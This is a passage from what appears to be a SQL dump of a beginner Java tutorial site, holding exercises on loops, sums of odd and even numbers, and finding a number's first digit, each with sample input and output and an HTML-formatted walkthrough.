justify;\">for(i=0;i&lt;=limit;i++)</span><br></p><p style=\"color: rgb(0, 0, 0); font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: start; line-height: 1;\">3. Here&nbsp;<span style=\"color: rgb(255, 0, 255);\">i is initialized to 0&nbsp;</span>and&nbsp;<span style=\"color: rgb(255, 0, 255);\">incremented by 1</span>&nbsp;for each iteration, instructions inside the for block are&nbsp;<span style=\"color: rgb(255, 0, 255);\">executed&nbsp; &nbsp; &nbsp; in every iteration.</span>&nbsp;Iteration stop when i becomes greater than limit.</p><p style=\"color: rgb(0, 0, 0); font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: start; line-height: 1;\"></p><p style=\"color: rgb(0, 0, 0); font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: start; line-height: 1;\"><br></p><p style=\"color: rgb(0, 0, 0); font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: start; line-height: 1;\">so value of i will be printed like&nbsp; &nbsp;<span style=\"color: rgb(8, 49, 57);\">0 1 2 3 ....limit&nbsp;</span></p></div><nav class=\"blog-nav nav nav-justified mb-2\" style=\"width: 750px; color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px;\"><br></nav><div><br></div>',24,'','',''),(1031,'Java Program to print N Natural numbers in reverse','Java-Program-to-print-N-Natural-numbers-in-reverse','<p style=\"line-height: 1;\">Get input n and print natural numbers from n in reverse.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n7</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nThe natural numbers in reverse:\r\n7 6 5 4 3 2 1</p>','B','','prog/java/NaturalInRev.java','<div class=\"entity_content\" style=\"margin-top: 20px; margin-bottom: 20px; text-align: justify; font-family: Roboto, serif; font-size: 17px;\"><p style=\"color: rgb(94, 94, 94); line-height: 1;\">1. Get input limit (from which number natural numbers to be printed in reverse)&nbsp;</p><p style=\"color: rgb(94, 94, 94); line-height: 1;\">2. Instruction(s) inside the for block{} are executed repeatedly till i greater than 0. (i&gt;0)</p><p style=\"color: rgb(94, 94, 94); line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"font-style: italic;\">for(i=lim;i&gt;=1;i--)</span><br></p><p style=\"line-height: 1;\"><span style=\"color: rgb(94, 94, 94);\">3. Here </span><span style=\"color: rgb(255, 0, 255);\">i is initialized to limit</span><span style=\"color: rgb(94, 94, 94);\"> and </span><span style=\"color: rgb(255, 0, 255);\">decremented by 1</span><span style=\"color: rgb(94, 94, 94);\"> for each iteration, instructions inside the for&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; block are executed in every iteration. Iteration stops when i becomes lesser than or equal to 0.</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(94, 94, 94);\">so value of i will be printed like </span><span style=\"color: rgb(8, 49, 57);\">limit, limit-1,limit-2.....,3,2,1</span><span style=\"color: rgb(94, 94, 94);\">&nbsp;</span></p></div><div><br></div>',24,'','',''),(1032,'Java Program to calculate sum of First N Natural numbers','Java-Program-to-calculate-sum-of-First-N-Natural-numbers','<p style=\"line-height: 1;\">Get input n and calculate the sum of first n natural numbers.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">The sum is: 15</p>','B','','prog/java/SumOfN.java','<div class=\"entity_content\" style=\"margin-top: 20px; margin-bottom: 20px; text-align: justify; font-family: Roboto, serif; font-size: 17px;\"><p style=\"color: rgb(94, 94, 94); line-height: 1;\">1. Get input limit (upto which number natural numbers to be printed)&nbsp;</p><p style=\"color: rgb(94, 94, 94); line-height: 1;\">2. Instruction(s) inside the for block{} are executed repeatedly till i less than or equal to limit.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (i&lt;=limit)</p><p style=\"color: rgb(94, 94, 94); line-height: 1;\">&nbsp; &nbsp;&nbsp;<span style=\"color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; font-style: italic;\">for(i=1;i&lt;=lim;i++)</span><br></p><p style=\"line-height: 1;\"><span style=\"color: rgb(94, 94, 94);\">3. Here </span><span style=\"color: rgb(255, 0, 255);\">i is initialized to 1</span><span style=\"color: rgb(94, 94, 94);\"> and </span><span style=\"color: rgb(255, 0, 255);\">incremented by 1</span><span style=\"color: rgb(94, 94, 94);\"> for each iteration, instructions inside the for block&nbsp; &nbsp; &nbsp; are executed in every iteration. Iteration stops when i becomes greater than limit.</span></p><p style=\"color: rgb(94, 94, 94); line-height: 1;\">so value of i will be added to the variable sum like</p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">sum = sum + i</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">sum = 0 + 1</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">sum = 1 + 2</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">sum = 3 + 3</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">sum = 6 + 4</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">.......</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">.......</span></p><p style=\"color: rgb(94, 94, 94); line-height: 1;\">Finally the sum will be printed using println</p></div>',24,'','',''),(1033,'Java Program to calculate sum of N given numbers','Java-Program-to-calculate-sum-of-N-given-numbers','<p style=\"line-height: 1;\">Get input n and n inputs and calculate the sum of n inputs.</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">Example:</p><p style=\"line-height: 1;\">\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">4\r\n</p><p style=\"line-height: 1;\">6 5 3 2</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">16</p>','B','','prog/java/SumOfNInputs.java','<p style=\"line-height: 1.6;\"><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px; text-align: justify;\"><font color=\"#000000\">1. Get input n (How many values to be added)&nbsp;</font></span></p><p style=\"line-height: 1.6;\"><font color=\"#000000\"><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px; text-align: justify;\">2.&nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (j&lt;=n) is true.</span></font></p><p style=\"line-height: 1.6;\"><font color=\"#000000\"><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">&nbsp; &nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">&nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px; text-align: justify;\">for(i=1;i&lt;=n;i++)</span><br></font></p><p style=\"line-height: 1;\"><font color=\"#000000\">3. <span style=\"font-family: &quot;Times New Roman&quot;;\">Here i is initialized to 1 and incremented by 1 for each iteration, instructions inside the for block are&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></font></p><p style=\"line-height: 1;\"><font color=\"#000000\"><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; executed&nbsp; &nbsp; &nbsp; in every iteration. iteration stops when i becomes greater than n.</span></font></p><p style=\"line-height: 1;\"><font color=\"#000000\"><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp;</span><span style=\"font-style: italic;\"><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 13px; text-align: justify;\">num=sc.nextInt();</span></span></font></p><p style=\"line-height: 1;\"><span style=\"font-style: italic;\"><font color=\"#000000\"><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp;&nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 13px; text-align: justify;\">sum=sum+num;</span></font></span></p><p style=\"line-height: 1;\"><font color=\"#000000\"><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; so value of num given by user will be added to sum at each iteration.</span><br></font></p><p style=\"line-height: 1;\"><font color=\"#000000\">&nbsp; &nbsp;<span style=\"font-family: &quot;Times New Roman&quot;;\"> sum = sum + num</span></font></p><p style=\"line-height: 1;\"><font color=\"#000000\"><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; sum = 0 + 5 (if 5 given)</span></font></p><p style=\"line-height: 1;\"><font color=\"#000000\"><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; sum = 5 + 2 (if 2 given)</span></font></p><p style=\"line-height: 1;\"><font color=\"#000000\"><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; sum = 7 + 9 (if 9 given)</span></font></p><p style=\"line-height: 1;\"><font color=\"#000000\"><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; ...........</span></font></p><p style=\"line-height: 1;\"><font color=\"#000000\"><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; ...........</span><br></font></p><p style=\"line-height: 1;\"><font color=\"#000000\"><span style=\"font-family: &quot;Times New Roman&quot;;\">after adding all n numbers given by user to sum, sum will be printed using system.out.println.</span></font><br></p>',24,'','',''),(1034,'Java Program to print sum of N ODD numbers','Java-Program-to-print-sum-of-N-ODD-numbers','<p style=\"line-height: 1;\">Get input n and print n odd numbers.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">The sum of N Odd numbers:49</p>','B','','prog/java/SumOfNOdd.java','<p style=\"line-height: 1;\">1.&nbsp; &nbsp; Get input N (How many odd numbers to be summed)</p><p style=\"line-height: 1;\">2.&nbsp; &nbsp; &nbsp;Instruction(s) inside the for block{} are executed repeatedly till  the second expression (j&lt;=N) is true.<br></p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style=\"color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; text-align: justify;\"><i>for(j=1,i=1;j&lt;=N;i=i+2,j++)&nbsp;</i></span><br></p><p style=\"line-height: 1;\">3.&nbsp;&nbsp;&nbsp;&nbsp;Here <span style=\"color: rgb(255, 0, 255);\">i and j are initialized to 1</span> and <span style=\"color: rgb(255, 0, 255);\">i is incremented by 2 and&nbsp; j is incremented by 1</span> for each iteration.</p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp;instructions inside the for block are executed in every iteration and <span style=\"color: rgb(255, 0, 255);\">iteration stops when j becomes&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;greater than N</span>. so value of i (1,3,5... ) will be added to sum.<br></p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; so odd numbers (i) are added to the sum for j --&gt; 1 to N times<br></p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp;&nbsp;<span style=\"color: rgb(41, 82, 24);\">&nbsp; sum = sum + j</span><br></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; &nbsp; &nbsp; sum = 0 + 1</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; &nbsp; &nbsp; sum = 1 + 3</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; &nbsp; &nbsp; sum = 4 + 5</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; &nbsp; &nbsp; sum = 9 + 7</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; &nbsp; &nbsp; ..................</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; &nbsp; &nbsp; ..................</span></p><p style=\"line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;after adding all N odd numbers to sum, sum will be printed using system.out.println()</p>',24,'','',''),(1035,'Java Program to print Sum of N Even numbers','Java-Program-to-print-sum-of-N-Even-numbers','<p style=\"line-height: 1;\">Get input n and print n even numbers.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n7</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nThe sum of N Even numbers:56</p>','B','','prog/java/SumOfNEven.java','<p style=\"line-height: 1;\">1.&nbsp; &nbsp; Get input N (How many even numbers to be summed)</p><p style=\"line-height: 1;\">2.&nbsp; &nbsp; &nbsp;Instruction(s) inside the for block{} are executed repeatedly till the second expression (j&lt;=N) is true.<br></p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style=\"color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; text-align: justify;\"><i>for(j=1,i=2;j&lt;=N;i=i+2,j++)</i></span><br></p><p style=\"line-height: 1;\">3.&nbsp;&nbsp;&nbsp;&nbsp;Here&nbsp;<span style=\"color: rgb(255, 0, 255);\">i is initialized to 2 and j is initialized to 1</span>&nbsp;and&nbsp;<span style=\"color: rgb(255, 0, 255);\">i is incremented by 2 and&nbsp; j is incremented by 1</span>&nbsp;for each&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;iteration.</p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp;instructions inside the for block are executed in every iteration and&nbsp;<span style=\"color: rgb(255, 0, 255);\">iteration stops when j becomes&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;greater than N</span>. so value of i (2,4,6... ) will be added to sum.<br></p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; so even numbers (i) are added to the sum for j --&gt; 1 to N times<br></p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp;&nbsp;<span style=\"color: rgb(41, 82, 24);\">&nbsp; sum = sum + j</span><br></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; &nbsp; &nbsp; sum = 0 + 2</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; &nbsp; &nbsp; sum = 2 + 4</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; &nbsp; &nbsp; sum = 6 + 6</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; &nbsp; &nbsp; sum = 12 + 8</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; &nbsp; &nbsp; ..................</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; &nbsp; &nbsp; ..................</span></p><p style=\"line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;after adding all N even numbers to sum, sum will be printed using system.out.println().</p>',24,'','',''),(1036,'Java Program to print ODD numbers till N','Java-Program-to-print-ODD-numbers-till-N','<p style=\"line-height: 1;\">Get input n and print n odd numbers.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n7</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n1 3 5 7 9 11 13</p>','B','','prog/java/NOdd.java','<p style=\"line-height: 1;\">\r\n</p><p style=\"line-height: 1;\">1. Get the input lim(Till which number the odd numbers to be printed)</p><p style=\"line-height: 1;\">2. Instruction(s) inside the for block{} are executed repeatedly till  the second expression (i&lt;=lim) is true.</p><p style=\"line-height: 1;\">&nbsp; &nbsp;&nbsp;<span style=\"color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; text-align: justify; font-style: italic;\">for(i=1;i&lt;=lim;i=i+2)</span><br></p><p style=\"line-height: 1;\">3. Here <span style=\"color: rgb(255, 0, 255);\">i is initialized to 1</span> and <span style=\"color: rgb(255, 0, 255);\">i is incremented by 2</span> for each iteration, instructions inside the for block are&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; executed in every iteration. <span style=\"color: rgb(255, 0, 255);\">Iteration stops when i becomes greater than lim.</span></p><p style=\"line-height: 1;\">&nbsp; &nbsp; so value of<span style=\"color: rgb(41, 82, 24);\"> i (1,3,5,7.....) </span>(odd numbers till lim) in each iteration will be printed using system.out.println</p>',24,'','raptor/odd_numbers_ApLm1wg.PNG',''),(1037,'Java Program to print Even numbers till N','Java-Program-to-print-Even-numbers-till-N','<p style=\"line-height: 1;\">Get input n and print n even numbers.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n2 4 6 8 10 12 14<br></p>','B','','prog/java/NEven.java','<p style=\"line-height: 1;\">1. Get the input lim(Till which number the even numbers to be printed)</p><p style=\"line-height: 1;\">2. Instruction(s) inside the for block{} are executed repeatedly till the second expression (i&lt;=lim) is true.</p><p style=\"line-height: 1;\">&nbsp; &nbsp;&nbsp;<span style=\"color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; text-align: justify; font-style: italic;\">for(i=2;i&lt;=lim;i=i+2)</span><br></p><p style=\"line-height: 1;\">3. Here&nbsp;<span style=\"color: rgb(255, 0, 255);\">i is initialized to 2</span>&nbsp;and&nbsp;<span style=\"color: rgb(255, 0, 255);\">i is incremented by 2</span>&nbsp;for each iteration, instructions inside the for block are&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; executed in every iteration.&nbsp;<span style=\"color: rgb(255, 0, 255);\">Iteration stops when i becomes greater than lim.</span></p><p style=\"line-height: 1;\">&nbsp; &nbsp; so value of<span style=\"color: rgb(41, 82, 24);\">&nbsp;i (2,4,6,8,....)&nbsp;</span>(even numbers till lim) in each iteration will be printed using system.out.println</p>',24,'','',''),(1038,'Java Program to calculate sum of Even numbers till N','Java-Program-to-calculate-sum-of-Even-numbers-till-N','<p style=\"line-height: 1;\">Get input n and calculate the sum of even numbers till n\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nThe Sum of  Even Number till N:6(2+4)</p>','B','','prog/java/SumOfEvenTillN.java','<p style=\"line-height: 1;\">\r\n</p><p style=\"line-height: 1;\">1. Get input N (To which even numbers to be added)</p><p style=\"line-height: 1;\">2. Instruction(s) inside the for block{} are executed repeatedly till  the second expression (j&lt;=N) is true.</p><p style=\"line-height: 1;\">&nbsp; &nbsp;<i>&nbsp;<span style=\"color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; text-align: justify;\">for(i=2;i&lt;N;i+=2)</span></i><br></p><p style=\"line-height: 1;\">3. Here <span style=\"color: rgb(255, 0, 255);\">i is initialized to 2</span> and <span style=\"color: rgb(255, 0, 255);\">incremented by 2</span> for each iteration, instructions inside the for block are executed&nbsp; &nbsp; &nbsp; in every iteration.<span style=\"color: rgb(255, 0, 255);\"> iteration stops when i becomes greater than n</span>. </p><p style=\"line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;so value of i (2,4,6,...n)will be added to sum.</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">&nbsp; &nbsp; <span style=\"color: rgb(41, 82, 24);\">sum = sum + i&nbsp;</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; sum = 0 + 2</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; sum = 2 + 4</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; sum = 6 + 6</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; ...................</span></p><p style=\"line-height: 1;\">after adding all&nbsp; even numbers till N to sum, sum will be printed using system.out.println.<br></p>',24,'','',''),(1039,'Java Program to calculate sum of ODD numbers till N','Java-Program-to-calculate-sum-of-ODD-numbers-till-N','<p style=\"line-height: 1;\">Get input n and calculate the sum of odd numbers till n\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nThe Sum Of odd Number Till N:9(1+3+5)</p>','B','','prog/java/SumOfOddTillN.java','<p style=\"line-height: 1;\">1. Get input N (To which odd numbers to be added)</p><p style=\"line-height: 1;\">2. Instruction(s) inside the for block{} are executed repeatedly till the second expression (j&lt;=N) is true.</p><p style=\"line-height: 1;\">&nbsp; &nbsp;<i>&nbsp;<span style=\"color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; text-align: justify;\">for(i=1;i&lt;N;i+=2)</span></i><br></p><p style=\"line-height: 1;\">3. Here&nbsp;<span style=\"color: rgb(255, 0, 255);\">i is initialized to 1</span>&nbsp;and&nbsp;<span style=\"color: rgb(255, 0, 255);\">incremented by 2</span>&nbsp;for each iteration, instructions inside the for block are executed&nbsp; &nbsp; &nbsp; in every iteration.<span style=\"color: rgb(255, 0, 255);\">&nbsp;iteration stops when i becomes greater than n</span>.</p><p style=\"line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;so value of i (1,3,5,...n)will be added to sum.</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">&nbsp; &nbsp;&nbsp;<span style=\"color: rgb(41, 82, 24);\">sum = sum + i&nbsp;</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; sum = 0 + 1</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; sum = 1 + 3</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; sum =&nbsp; 4 + 5</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; ...................</span></p><p style=\"line-height: 1;\">after adding all&nbsp; odd numbers till N to sum, sum will be printed using system.out.println.</p>',24,'','',''),(1040,'Java Program to print Hello World for N times','Java-Program-to-print-Hello-World-for-N-times','<p style=\"line-height: 1;\">Get input n and print the text \"Hello World\" for n times\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n3</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nHello World</p><p style=\"line-height: 1;\">Hello World</p><p style=\"line-height: 1;\">Hello World</p>','B','','prog/java/Hello.java','<p style=\"line-height: 1;\">1. Get limit from user (How many times \"Hello World\" Should be printed)</p><p style=\"line-height: 1;\">2. Instruction(s) inside the for block{} are executed repeatedly till  the second expression (i&lt;=lim) is true.</p><p style=\"line-height: 1;\">&nbsp; &nbsp;<span style=\"font-style: italic;\">&nbsp;<span style=\"color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; text-align: justify;\">for(i=1;i&lt;=lim;i++)</span></span></p><p style=\"line-height: 1;\">3. Here <span style=\"color: rgb(255, 0, 255);\">i is initialized to 1 </span>and <span style=\"color: rgb(255, 0, 255);\">incremented by 1 for each iteration</span>, instructions inside the for block are executed&nbsp; &nbsp; &nbsp; unless <span style=\"color: rgb(255, 0, 255);\">i becomes greater than lim</span>.</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">so the string literal \"Hello World\" will be printed lim times.<br></p>',24,'','',''),(1041,'Java Program to print the first digit of a given number','Java-Program-to-print-the-first-digit-of-a-given-number','<p style=\"line-height: 1;\">Get input num and display the first digit of number num\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n675</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nThe fisrt digit is :6</p>','B','','prog/java/FirstDigit.java','<p style=\"line-height: 1;\">1. Get num (to which first digit is to be identified)</p><p style=\"line-height: 1;\">2. Instruction(s) inside the while block{} are executed repeatedly till  expression (num&gt;=10) is true.</p><p style=\"line-height: 1;\">3. <span style=\"color: rgb(255, 0, 255);\">Divide the number num by 10 untill it becomes lesser than 10. </span></p><p style=\"line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;once it is less than 10 print the num using system.out.println.</p><p style=\"line-height: 1;\">\r\n\r\n</p><p style=\"line-height: 1;\">statement num = num/10 divides the num by 10 repeatedly until it num is less than 10</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">Example&nbsp;</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">487</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">487/10 = 48</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">48 / 10 = 4</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">4 is less than 10, so print it.</span></p>',24,'','',''),(1042,'Java Program to find whether the first digit of given number is odd or even','Java-Program-to-find-whether-the-first-digit-of-given-number-is-odd-or-even','<p style=\"line-height: 1;\">Get input num and check whether the first digit of number num is odd or even</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n34</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\"> The first digit is :Even\r\n</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n67</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\nEven</p>','B','','prog/java/FirDORE.java','<p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\">1. Get num (to which first digit is to be identified)</p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\">2. Instruction(s) inside the while block{} are executed repeatedly till expression (num&gt;=10) is true.</p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\">3.&nbsp;<span style=\"color: rgb(255, 0, 255);\">Divide the number num by 10 untill it becomes lesser than 10.</span></p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;once it is less than 10, check whether the number is even</p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\">&nbsp; &nbsp; if even, print even. else print odd.<br></p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\"></p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\">statement num = num/10 divides the num by 10 repeatedly until it num is less than 10</p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\"><br></p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">Example&nbsp;</span></p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">487</span></p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">487/10 = 48</span></p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">48 / 10 = 4</span></p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">4 is less than 10, so check whether 4 is even.</span></p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">4 is even, so print even.</span></p>',24,'','',''),(1043,'Java Program to multiply two numbers without using * operator','Java-Program-to-multiply-two-numbers-without-using-operator','<p style=\"line-height: 1;\">Get two inputs  num1 and num2, compute the product of num1 and num2 without using  * operator</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5 6</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n30</p>','B','<p>import java.util.*;</p><p>class MulTab</p><p>&nbsp;{</p><p>&nbsp; &nbsp; &nbsp;public static void main(String args[])</p><p>&nbsp; &nbsp; 